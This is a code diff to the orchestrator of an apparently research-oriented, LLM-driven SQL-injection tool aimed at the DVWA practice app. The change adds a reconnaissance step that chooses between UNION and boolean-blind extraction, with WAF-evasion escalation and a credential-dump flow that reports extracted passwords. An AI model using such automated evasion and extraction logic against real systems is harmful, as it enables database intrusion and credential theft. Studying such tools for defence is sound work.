@@ -20,9 +20,11 @@ from .discovery import ProbeResult, SchemaDiscovery, pick_credential_columns
 from .dvwa import DVWAClient
 from .evasion import EvasionEngine
 from .llm import OllamaClient
+from .recon import TechniqueSelector
 from .types import RunResult
 
 Logger = Optional[Callable[[str], None]]
+_RECON_BUDGET = 60   # sondeos del reconocimiento (presupuesto propio, no gasta los pasos del ataque)
 
 
 def _valid_dump(crafted: dict, table: str, cred_columns: tuple[str, str]) -> bool:
@@ -58,33 +60,50 @@ class Orchestrator:
         self.dvwa.set_security(level)
         say(f"[Orchestrator] login ok, nivel de seguridad '{level}'")
 
-        engine = EvasionEngine()
+        engine = EvasionEngine()            # motor del ATAQUE
+        recon_engine = EvasionEngine()      # motor del RECONOCIMIENTO (aparte, no gasta pasos del ataque)
         counter = {"steps": 0}
-        payload_log: list[dict] = []   # cada payload que se envía, con su estado (para auditar/exportar)
+        recon_counter = {"steps": 0}
+        payload_log: list[dict] = []        # cada payload que se envía, con su estado (auditoría/export)
 
-        def probe(base_sql: str) -> ProbeResult:
+        def _probe(base_sql: str, eng: EvasionEngine, cnt: dict, budget: int) -> ProbeResult:
             # Envío consciente del WAF: escala disfraces hasta que uno pasa (o se agota la escalera).
             while True:
-                if counter["steps"] >= max_steps or time.monotonic() > deadline:
+                if cnt["steps"] >= budget or time.monotonic() > deadline:
                     return ProbeResult(blocked=True)
-                payload, pipeline = engine.next_payload(base_sql)
+                payload, pipeline = eng.next_payload(base_sql)
                 if payload is None:
                     return ProbeResult(blocked=True)
-                counter["steps"] += 1
+                cnt["steps"] += 1
                 resp = self.dvwa.run_sqli(payload, level)
-                payload_log.append({"payload": payload, "phase": "descubrimiento",
+                payload_log.append({"payload": payload, "phase": "ataque",
                                     "blocked": resp.blocked, "http_status": resp.http_status})
                 if resp.blocked:
                     say(f"[WAF] bloqueó (HTTP {resp.http_status}) — escalando evasión")
-                    engine.record(pipeline, payload, blocked=True)
+                    eng.record(pipeline, payload, blocked=True)
                     continue
-                engine.record(pipeline, payload, blocked=False)
+                eng.record(pipeline, payload, blocked=False)
                 cells = [[r.get("first_name", ""), r.get("surname", "")] for r in resp.rows]
                 return ProbeResult(cells=cells, db_error=resp.db_error, blocked=False)
+
+        def probe(base_sql: str) -> ProbeResult:
+            return _probe(base_sql, engine, counter, max_steps)
+
+        def recon_probe(base_sql: str) -> ProbeResult:
+            return _probe(base_sql, recon_engine, recon_counter, _RECON_BUDGET)
+
+        def time_probe(base_sql: str) -> float:
+            t0 = time.monotonic()
+            _probe(base_sql, recon_engine, recon_counter, _RECON_BUDGET)
+            return time.monotonic() - t0
 
         # El Planner plantea la metodología (no asume esquema).
         strategy = str(self.planner.plan(level).get("strategy", ""))
         say(f"[Planner] {strategy}")
+
+        # RECONOCIMIENTO: elige la técnica por observación (OWASP WSTG), ANTES de atacar — nunca
+        # por el nombre del WAF. Así no prueba una técnica tras otra: escoge la correcta de entrada.
+        recon = TechniqueSelector(recon_probe, time_probe, say=say).select()
 
         # El Analyst elige las columnas de credenciales; si falla, respaldo determinista.
         def pick(table: str, columns: list[str]) -> Optional[tuple[str, str]]:
@@ -94,35 +113,48 @@ class Orchestrator:
                 return picked
             return pick_credential_columns(table, columns)
 
-        # Descubrir el esquema por comandos (ORDER BY, information_schema).
         discovery = SchemaDiscovery(probe, say=say, pick=pick)
-        res = discovery.discover()
-
         extracted: list[dict[str, str]] = []
         success = False
-        if res.cred_columns[0]:
-            # El Executor GENERA el payload desde el esquema descubierto; se valida y hay respaldo.
-            crafted = self.executor.craft_dump(
-                res.quote, res.columns, res.reflected, res.target_table, res.cred_columns
-            )
-            template = discovery.build_dump_payload(res)
-            payload = str(crafted.get("payload", "")).strip() if _valid_dump(
-                crafted, res.target_table, res.cred_columns
-            ) else template
-            say(f"[Executor] payload de extracción: {payload!r}")
-            extracted = discovery.extract(payload, res)
-            success = bool(extracted)
-            if success:
-                conf = "verificada" if res.verified else "sin verificar"
-                say(f"[Orchestrator] SUCCESS — {len(extracted)} credenciales extraídas "
-                    f"(DBMS={res.dbms or '?'}, confirmada por {res.techniques}, extracción {conf})")
-        if not success:
-            # Fallback boolean-blind: si UNION está bloqueado pero el booleano pasa (p. ej. NAXSI
-            # bloquea UNION/SELECT pero deja LIKE), extrae carácter por carácter con LIKE.
+        trace: list[str] = [f"recon: señales={recon.signals} -> técnica elegida={recon.technique}"]
+
+        if recon.technique == "union":
+            # Técnica elegida: UNION. Se descubre el esquema y se extrae por UNION.
+            res = discovery.discover()
+            trace = res.trace
+            if res.cred_columns[0]:
+                crafted = self.executor.craft_dump(
+                    res.quote, res.columns, res.reflected, res.target_table, res.cred_columns
+                )
+                template = discovery.build_dump_payload(res)
+                payload = str(crafted.get("payload", "")).strip() if _valid_dump(
+                    crafted, res.target_table, res.cred_columns
+                ) else template
+                say(f"[Executor] payload de extracción: {payload!r}")
+                extracted = discovery.extract(payload, res)
+                success = bool(extracted)
+                if success:
+                    conf = "verificada" if res.verified else "sin verificar"
+                    say(f"[Orchestrator] SUCCESS — {len(extracted)} credenciales extraídas "
+                        f"(DBMS={res.dbms or '?'}, confirmada por {res.techniques}, extracción {conf})")
+            # Respaldo INFORMADO (no prueba a ciegas): solo si el reconocimiento ya vio que el
+            # booleano es viable.
+            if not success and recon.signals.get("boolean"):
+                blind = self._blind_fallback(engine, level, deadline, counter, say, payload_log)
+                if blind:
+                    extracted, success = [blind], True
+                    trace.append(f"extracción boolean-blind (LIKE): {blind}")
+        elif recon.technique == "boolean":
+            # Técnica elegida: boolean-blind. UNION no pasa el WAF -> se va directo a la ciega.
+            say("[Recon] UNION no pasa el WAF; el booleano sí → extracción ciega directa "
+                "(sin intentar UNION)")
             blind = self._blind_fallback(engine, level, deadline, counter, say, payload_log)
             if blind:
                 extracted, success = [blind], True
-                res.trace.append(f"extracción boolean-blind (LIKE): {blind}")
+                trace.append(f"extracción boolean-blind (LIKE): {blind}")
+        else:
+            say(f"[Recon] ninguna técnica atacable (señales={recon.signals})")
+
         if not success:
             say("[Orchestrator] FAILED — no se extrajeron credenciales")
 
@@ -131,10 +163,10 @@ class Orchestrator:
             level=level,
             success=success,
             elapsed_seconds=round(elapsed, 2),
-            steps_used=counter["steps"],
+            steps_used=counter["steps"] + recon_counter["steps"],
             extracted=extracted,
             strategy=strategy,
-            trace=res.trace,
+            trace=trace,
             waf_profile=engine.profile.summary(),
             payloads=payload_log,
             slm_metrics=self.llm.metrics() if hasattr(self.llm, "metrics") else {},
